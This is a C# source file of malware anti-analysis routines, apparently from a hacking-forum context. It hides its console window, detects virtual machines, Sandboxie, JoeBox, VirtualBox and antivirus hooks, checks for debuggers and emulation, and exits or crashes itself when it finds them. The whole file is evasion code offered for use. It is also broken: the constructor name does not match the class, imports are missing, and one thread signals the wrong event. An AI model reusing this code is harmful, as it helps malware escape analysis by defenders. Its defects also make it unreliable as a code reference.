using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Threading;

namespace Hishiro_San
{
    class Kaizaki
    {
        private const int SW_HIDE = 0;

        public static void HideWindow()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string running);

        public static bool DetectVirtualMachine()
        {
            using (var searcher = new System.Management.ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        string manufacturer = item["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                            || manufacturer.Contains("vmware")
                            || item["Model"].ToString() == "VirtualBox" || GetModuleHandle("cmdvrt32.dll").ToInt32() != 0 || GetModuleHandle("SxIn.dll").ToInt32() != 0
                   || GetModuleHandle("SbieDll.dll").ToInt32() != 0 || GetModuleHandle("Sf2.dll").ToInt32() != 0 ||
                   GetModuleHandle("snxhk.dll").ToInt32() != 0)
                        {
                            return true;
                        }


                        var hypervisorPresentProperty
                          = item.Properties
                                .OfType<PropertyData>()
                                .FirstOrDefault(p => p.Name == "HypervisorPresent");

                        if ((bool?)hypervisorPresentProperty?.Value == true)
                        {
                            return true;
                        }
                    }
                }
            }
            return false;
        }

        public static void Virtual()
        {
            if (DetectVirtualMachine())
                Environment.Exit(0);  // exit console if Vm detected
        }




        // Anti analysis techniques taken from gigajew@hf props to my man

        public AntII()
        {
            CheckRemoteDebuggerPresentEx = CreateDelegateAPI<CheckRemoteDebuggerPresent>(LoadLibraryA("kernelbase.dll"));
            IsDebuggerPresentEx = CreateDelegateAPI<IsDebuggerPresent>(LoadLibraryA("kernelbase.dll"));
            GetModuleFileNameEx = CreateDelegateAPI<GetModuleFileNameA>(LoadLibraryA("kernelbase.dll"));
            _random = new Random(Guid.NewGuid().GetHashCode());
            _debuggerEvent = new ManualResetEvent(false);
            _debuggerThread = new Thread(AntiDebuggerThread) { IsBackground = true };
            _hijackEvent = new ManualResetEvent(false);
            _hijackThread = new Thread(AntiHijackThread) { IsBackground = true };
        }

        /// <summary>
        /// Start all protections methods by gigajew@hf
        /// </summary>
        public void Protect()
        {
            _running = true;
            if (IsCodeEmulated() || AreSandboxArtifactsPresent())
            {
                ClearMemory();
                Crash();
            }
            ResetEvents();
            StartThreads();
            WaitEvents();
        }

       
        private void ResetEvents()
        {
            _debuggerEvent.Reset();
            _hijackEvent.Reset();
        }

        private void WaitEvents()
        {
            _debuggerEvent.WaitOne();
            _hijackEvent.WaitOne();
        }

        private void StartThreads()
        {
            _debuggerThread.Start();
            _hijackThread.Start();
        }

        private void StopThreads()
        {
            _debuggerThread.Abort();
            _hijackThread.Abort();
        }

        private void AntiDebuggerThread()
        {
            while (_running)
            {
                if (IsDebuggerAttached())
                {
                    ClearMemory();
                    Crash();
                }
                _debuggerEvent.Set();
                Thread.Sleep(_random.Next(80, 120));
            }
        }

        private void AntiHijackThread()
        {
            while (_running)
            {
                if (IsProcessHijacked())
                {
                    ClearMemory();
                    Crash();
                }
                _debuggerEvent.Set();
                Thread.Sleep(_random.Next(80, 120));
            }
        }

        public bool IsProcessHijacked()
        {
            using (var process = Process.GetCurrentProcess())
            {
                var modules = process.Modules;
                for (int i = 1; i < modules.Count - 1; i++)
                {
                    if (modules[i].FileVersionInfo.ProductMajorPart < 4)
                    {
                        return true;
                    }
                }
            }

            return false;
        }

        public bool AreSandboxArtifactsPresent()
        {
            var namebuilder = new StringBuilder(256);
            GetModuleFileNameEx(Marshal.GetHINSTANCE(typeof(AntII).Assembly.ManifestModule), namebuilder, (uint)namebuilder.Capacity);
            if (Path.GetExtension(Path.GetFullPath(namebuilder.ToString())).ToLower() == ".bin")
            {
                return true;
            }
            using (var process = Process.GetCurrentProcess())
            {
                var modules = process.Modules;
                for (int i = 1; i < modules.Count - 1; i++)
                {
                    switch (modules[i].ModuleName.ToLower())
                    {
                        case "sbie.dll":
                            return true;
                    }

                }
            }
            foreach (var process in Process.GetProcesses())
            {
                switch (process.ProcessName.ToLower())
                {
                    case "vboxservice.exe":
                        return true;
                    case "joeboxserver.exe":
                        return true;
                    case "joeboxcontrol.exe":
                        return true;
                    case "vboxtray.exe":
                        return true;
                }
            }
            return false;
        }

        public bool IsDebuggerAttached()
        {
            if (Debugger.IsAttached)
            {
                return true;
            }

            if (IsDebuggerPresentEx() != default(IntPtr))
            {
                return true;
            }

            CheckRemoteDebuggerPresentEx((IntPtr)(-1), out IntPtr dres);
            if (dres != default(IntPtr))
            {
                return true;
            }

            return false;
        }

        public bool IsCodeEmulated()
        {
            var then = DateTime.Now;
            var timeout = _random.Next(800, 1200);
            typeof(Thread).GetMethod("Sleep", BindingFlags.Public | BindingFlags.Static, null, new Type[] { typeof(int) }, null).Invoke(this, new object[] { timeout });
            var now = DateTime.Now;
            if (((now - then).TotalMilliseconds) < timeout)
            {
                return true;
            }
            return false;
        }

        private T CreateDelegateAPI<T>(IntPtr library)
        {
            return (T)(Marshal.GetDelegateForFunctionPointer(GetProcAddress(library, typeof(T).Name), typeof(T)) as object);
        }

        private void ClearMemory()
        {
            GC.Collect(0, GCCollectionMode.Forced);
            GC.WaitForFullGCComplete();
            GC.WaitForPendingFinalizers();
        }

        private void Crash()
        {
            _running = false;
            throw new BadImageFormatException(null, default(Exception));
        }


        [DllImport("kernelbase.dll")]
        private static extern IntPtr GetProcAddress(IntPtr library, string function);

        [DllImport("kernelbase.dll")]
        private static extern IntPtr LoadLibraryA(string library);

        private delegate IntPtr IsDebuggerPresent();
        private IsDebuggerPresent IsDebuggerPresentEx;

        private delegate IntPtr CheckRemoteDebuggerPresent(IntPtr handle, out IntPtr hresult);
        private CheckRemoteDebuggerPresent CheckRemoteDebuggerPresentEx;

        private delegate void GetModuleFileNameA(IntPtr handle, StringBuilder builder, uint capacity);
        private GetModuleFileNameA GetModuleFileNameEx;

        private Random _random;
        private bool _running;

        private ManualResetEvent _debuggerEvent;
        private Thread _debuggerThread;

        private ManualResetEvent _hijackEvent;
        private Thread _hijackThread;
    

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    }
}
